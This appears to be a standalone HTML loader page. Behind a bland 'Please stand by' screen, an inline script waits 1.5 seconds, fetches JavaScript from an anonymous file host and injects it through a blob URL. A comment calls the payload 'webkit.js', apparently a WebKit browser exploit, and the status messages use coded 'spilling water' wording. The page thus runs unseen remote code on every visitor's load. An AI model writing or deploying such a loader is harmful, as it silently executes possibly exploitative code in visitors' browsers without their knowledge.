<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  setTimeout(() => {
    fetch('https://files.catbox.moe/cwedrd.js') // Your untouched webkit.js
      .then(res => res.text())
      .then(js => {
        const blob = new Blob([js], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);

        const script = document.createElement('script');
        script.src = url;
        script.defer = true;

        script.onload = () => {
          document.getElementById("status").textContent = "Spilling 250ml... (unless frozen)";
        };

        script.onerror = () => {
          document.getElementById("status").textContent = "Water not spilled.";
        };

        document.head.appendChild(script);
      })
      .catch(err => {
        document.getElementById("status").textContent = "Bottle not filled: " + err.message;
      });
  }, 1500);
</script>

</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
